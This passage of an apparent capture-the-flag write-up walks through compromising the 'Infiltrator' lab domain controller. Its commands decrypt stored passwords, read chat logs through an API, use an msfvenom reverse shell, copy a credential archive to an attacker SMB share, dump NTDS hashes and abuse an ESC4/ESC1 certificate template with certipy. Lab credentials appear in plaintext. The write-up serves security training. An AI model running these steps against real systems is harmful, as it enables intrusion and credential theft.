+<span class="k">def</span><span class="w"> </span><span class="nf">pkcs7_unpad</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+<span class="w">    </span><span class="n">pad_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">data</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">data</span><span class="p">[:</span><span class="o">-</span><span class="n">pad_len</span><span class="p">]</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">aes_decrypt_base64</span><span class="p">(</span><span class="n">cipher_b64</span><span class="p">:</span><span class="w"> </span><span class="nb">str</span><span class="p">,</span><span class="w"> </span><span class="n">key_str</span><span class="p">:</span><span class="w"> </span><span class="nb">str</span><span class="p">)</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="nb">str</span><span class="p">:</span>
+<span class="w">    </span><span class="n">key_bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">key_str</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+<span class="w">    </span><span class="n">iv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">bytes</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span><span class="w">  </span><span class="c1"># 16 null bytes</span>
+<span class="w">    </span><span class="n">cipher_bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">cipher_b64</span><span class="p">)</span>
+
+<span class="w">    </span><span class="n">cipher</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key_bytes</span><span class="p">,</span><span class="w"> </span><span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span><span class="w"> </span><span class="n">iv</span><span class="p">)</span>
+<span class="w">    </span><span class="n">plaintext_padded</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">cipher_bytes</span><span class="p">)</span>
+<span class="w">    </span><span class="n">plaintext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pkcs7_unpad</span><span class="p">(</span><span class="n">plaintext_padded</span><span class="p">)</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">plaintext</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">double_decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span><span class="w"> </span><span class="n">key</span><span class="p">):</span>
+<span class="w">    </span><span class="c1"># First pass</span>
+<span class="w">    </span><span class="n">first_pass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aes_decrypt_base64</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span><span class="w"> </span><span class="n">key</span><span class="p">)</span>
+<span class="w">    </span><span class="c1"># Second pass</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">aes_decrypt_base64</span><span class="p">(</span><span class="n">first_pass</span><span class="p">,</span><span class="w"> </span><span class="n">key</span><span class="p">)</span>
+
+<span class="k">if</span><span class="w"> </span><span class="vm">__name__</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+<span class="w">    </span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;b14ca5898a4e4133bbce2ea2315a1916&quot;</span>
+<span class="w">    </span><span class="n">cipher_text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;TGlu22oo8GIHRkJBBpZ1nQ/x6l36MVj3Ukv4Hw86qGE=&quot;</span>
+
+<span class="w">    </span><span class="n">decrypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">double_decrypt</span><span class="p">(</span><span class="n">cipher_text</span><span class="p">,</span><span class="w"> </span><span class="n">key</span><span class="p">)</span>
+<span class="w">    </span><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Decrypted password: </span><span class="si">{</span><span class="n">decrypted</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<p><img alt="dec" src="../images/Infiltrator/dec.png" /></p>
+<p><code>winrm_svc | WinRm@$svc^!^P</code></p>
+<p>I'll login into the app with these credentials.</p>
+<p><img alt="login" src="../images/Infiltrator/login.png" /></p>
+<h2>Reading the chat logs</h2>
+<p>At this point, I moved to my windows VM because the linux OM client did not seem to work properly.</p>
+<p>After some switching back and forth between the two VMs, I managed to connect to the server on my windows VM.</p>
+<p><img alt="note" src="../images/Infiltrator/note.png" /></p>
+<p>I quickly noticed this new note entry that was not displayed in the linux client.</p>
+<p><img alt="message" src="../images/Infiltrator/message.png" /></p>
+<p>And I also found this message, which immediately shifts my focus towards getting more information about this group.</p>
+<p>Back in the winrm_svc remote shell, I found a few interesting database files.</p>
+<p><img alt="database" src="../images/Infiltrator/database.png" /></p>
+<p>With something related to the mentioned group within.</p>
+<p><img alt="database1" src="../images/Infiltrator/database1.png" /></p>
+<p>I've found a way to retrieve chat logs in the OM online documentation.</p>
+<p><code>https://support.outputmessenger.com/chat-room-api/</code></p>
+<p>Using the API key from earlier, and this string that looks like a roomkey, I should be able to extract the chat history of the chiefs marketing chat, which has the password of O.Martinez inside.</p>
+<p><code>curl -s -k "http://127.0.0.1:14125/api/chatrooms/logs?roomkey=20240220014618@conference.com&amp;fromdate=2024/02/01&amp;todate=2024/09/01" -H "API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG" -H "Accept: application/json, text/javascript, */*"</code></p>
+<p><img alt="pile" src="../images/Infiltrator/pile.png" /></p>
+<p>And at the bottom, I can see a credential pair for O.Martinez.</p>
+<p><code>O.Martinez | m@rtinez@1996!</code></p>
+<h2>Getting a shell as O.Martinez</h2>
+<p>These credentials worked for OM.</p>
+<p><img alt="omartinez" src="../images/Infiltrator/omartinez.png" /></p>
+<p>From the calendar menu, I can set an event. Something like a scheduled task in windows or a cronjob in linux.</p>
+<p><img alt="runapp" src="../images/Infiltrator/runapp.png" /></p>
+<p>I created a .exe reverse shell via msfvenom, and I got it both onto the target machine and my windows VM. They have to be in the exact same location as I'll be setting the application to run locally, which will cause the same app to run on the target.</p>
+<p>I didn't logout from OM, which caused a reverse shell connection from my own machine...</p>
+<p>After repeating the event setup, I logged out from OM and waited tor a hit.</p>
+<p><img alt="shell" src="../images/Infiltrator/shell.png" /></p>
+<h2>Analyzing the PCAP file</h2>
+<p>I found a PCAP file within O.Martinez' user folder.</p>
+<p><img alt="pcap" src="../images/Infiltrator/pcap.png" /></p>
+<p>After transfering it back, I will import the PCAP file into wireshark to analyze it.</p>
+<p><img alt="wireshark" src="../images/Infiltrator/wireshark.png" /></p>
+<p>I'm searching for interesting things like files, login attempts and unusual protocols being used.</p>
+<p><img alt="bitlocker" src="../images/Infiltrator/bitlocker.png" /></p>
+<p>Bitlocker is definitely one of those things. I may be able to export the archive from this PCAP. I'll go to file -&gt; export objects -&gt; HTTP.</p>
+<p><img alt="export" src="../images/Infiltrator/export.png" /></p>
+<p>I can also see an interesting <code>change_auth_token</code> entry. I'll take a look at it later, as for now I'll grab the bigger BitLocker archive.</p>
+<p><img alt="fail" src="../images/Infiltrator/fail.png" /></p>
+<p>It contains an HTML file, but requires a password. I'll use 7z2john to get a crackable hash of the archive, then I will try cracking it with john.</p>
+<p><img alt="cracked" src="../images/Infiltrator/cracked.png" /></p>
+<p><code>archive | zipper</code></p>
+<p>I extracted the archive, and opened the HTML file in my browser.</p>
+<p><img alt="recovery" src="../images/Infiltrator/recovery.png" /></p>
+<p>It contains a BitLocker recovery key. I'll keep it saved just in case it becomes useful later on.</p>
+<p>Now I can switch my focus back to the <code>change_auth_token</code> entry.</p>
+<p><img alt="api" src="../images/Infiltrator/api.png" /></p>
+<p>I found the related packet rather quickly. I'll get more information by following the TCP stream(right click -&gt; follow TCP stream)</p>
+<p><img alt="creds" src="../images/Infiltrator/creds.png" /></p>
+<p>And a password is revealed. I'm assuming that it'll be related to O.Martinez, so I'll confirm it with netexec.</p>
+<p><img alt="confirm1" src="../images/Infiltrator/confirm1.png" /></p>
+<h2>RDP as O.Martinez</h2>
+<p>I checked a few things, and I found out that O.Martinez can RDP into the machine.</p>
+<p><img alt="rdp" src="../images/Infiltrator/rdp.png" /></p>
+<p>Connecting to a windows machine on linux via RDP is possible, and I'll use xfreerdp for that.</p>
+<p><code>xfreerdp /u:o.martinez /p:'M@rtinez_P@ssw0rd!' /v:10.10.11.31 /d:infiltrator.htb</code></p>
+<p><img alt="desktop" src="../images/Infiltrator/desktop.png" /></p>
+<p>There is a strict time limit for each session. This could get annoying really quickly.</p>
+<p><img alt="drive" src="../images/Infiltrator/drive.png" /></p>
+<p>I found a bitlocker protected E: drive. The recovery key I found earlier will allow me to access this drive.</p>
+<p>I got access to the drive, and continued my search.</p>
+<p><img alt="backup" src="../images/Infiltrator/backup.png" /></p>
+<p>In the administrator's documents folder, I found this Backup_Credentials.7z archive. I can setup an SMB server on my machine to copy it over.</p>
+<div class="codehilite"><pre><span></span><code>impacket-smbserver FILESHARE /home/kalin/Infiltrator/share -smb2support -username test -password test - to create the smbserver
+
+net use \\10.10.16.3\FILESHARE /user:test test - to make my smbserver available
+
+copy Backup_Credentials.7z \\10.10.16.3\FILESHARE\Backup_Credentials.7z - to copy the file from the RDP session to my box
+</code></pre></div>
+
+<p><img alt="success" src="../images/Infiltrator/success.png" /></p>
+<h2>Extracting data from the hives and the NTDS.DIT file</h2>
+<p><img alt="unzip" src="../images/Infiltrator/unzip.png" /></p>
+<p>This archive was not password protected, and it revealed 3 very valuable files.</p>
+<p>I can use the hives and the ntds.dit file with secretsdump to dump the hashes of users.</p>
+<p><code>impacket-secretsdump -system registry/SYSTEM -security registry/SECURITY -ntds 'Active Directory'/ntds.dit LOCAL</code></p>
+<p><img alt="hashes" src="../images/Infiltrator/hashes.png" /></p>
+<p>However, I could not use this hash to remote as the administrator. I'll use a different tool to get more information out of the ntds.dit file.</p>
+<p><code>https://github.com/xmco/parse_ntds</code></p>
+<p>I cloned the repo and ran this command to dump everything from the file.</p>
+<p><code>python scripts/parse_ntds.py  -f ../'Active Directory'/ntds.dit -s ../registry/SYSTEM -v --dump-all</code></p>
+<p><img alt="password" src="../images/Infiltrator/password.png" /></p>
+<p>And found something that looks an awful lot like a password.</p>
+<p>I'll check these credentials, just like before, with netexec.</p>
+<p><code>lan_managment | l@n_M@an!1331</code></p>
+<p><img alt="confirm2" src="../images/Infiltrator/confirm2.png" /></p>
+<h2>Taking over the infiltrator_svc$ account</h2>
+<p><img alt="gmsaperm" src="../images/Infiltrator/gmsaperm.png" /></p>
+<p>Taking a look back at bloodhound, the newly compromised lan managment account can read the GMSA password of infiltrator_svc$.</p>
+<p><img alt="what" src="../images/Infiltrator/what.png" /></p>
+<p>And that account is in the domain computers group. Not only that, its description also contains the FQDN of the DC, which is unusual.</p>
+<p>I'll read the hash using netexec.</p>
+<p><code>nxc ldap 10.10.11.31 -u lan_managment -p 'l@n_M@an!1331' --gmsa</code></p>
+<h2>Abusing ESC4 to ESC1</h2>
+<p>I began searching by the process of elimination, looking for any interesting attack paths that could lead me further.</p>
+<p><img alt="tmp" src="../images/Infiltrator/tmp.png" /></p>
+<p>The mention of the TPM(Trusted Platform Module) made me think about certificates, so that's what I will check next.</p>
+<p><code>certipy-ad find -enabled -vulnerable -dc-ip 10.10.11.31 -dc-host dc01.infiltrator.htb -target-ip 10.10.11.31 -u 'infiltrator_svc$' -hashes '653b2726881d6e5e9ae3690950f9bcc4'</code></p>
+<p><img alt="esc4" src="../images/Infiltrator/esc4.png" /></p>
+<p>Infiltrator_svc can modify the template in a way that allow me to specify an UPN for authentication as a different user.</p>
+<p>First, I'll modify the template to create ESC1.</p>
+<p><code>certipy-ad template -template 'Infiltrator_Template' -write-default-configuration -dc-ip 10.10.11.31 -dc-host dc01.infiltrator.htb -target-ip 10.10.11.31 -u 'infiltrator_svc$' -hashes '653b2726881d6e5e9ae3690950f9bcc4'</code></p>
+<p><img alt="cert" src="../images/Infiltrator/cert.png" /></p>
+<p>Before requesting, I'll quickly grab the administrator's SID as it will be needed very soon.</p>
+<p><code>certipy-ad account -u 'infiltrator_svc$' -hashes '653b2726881d6e5e9ae3690950f9bcc4' -dc-ip '10.10.11.31' -user 'administrator' read</code></p>
+<p><img alt="cert2" src="../images/Infiltrator/cert2.png" /></p>
+<p>Now I can request the administrator certificate.</p>
+<p><code>certipy-ad req -u 'infiltrator_svc$@infiltrator.htb' -hashes '653b2726881d6e5e9ae3690950f9bcc4' -dc-ip '10.10.11.31' -target 'dc01.infiltrator.htb' -ca 'infiltrator-DC01-CA' -template 'Infiltrator_Template' -upn 'administrator@infiltrator.htb' -sid 'S-1-5-21-2606098828-3734741516-3625406802-500'</code></p>
+<p><img alt="cert3" src="../images/Infiltrator/cert3.png" /></p>
+<p>I'll authenticate with the requested certificate to get the administrator's hash.</p>
+<p><code>certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.31 -username administrator</code></p>
+<p><img alt="cert4" src="../images/Infiltrator/cert4.png" /></p>
+<p>Finally, I'll remote into the machine with these credentials.</p>
+<p><img alt="root" src="../images/Infiltrator/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
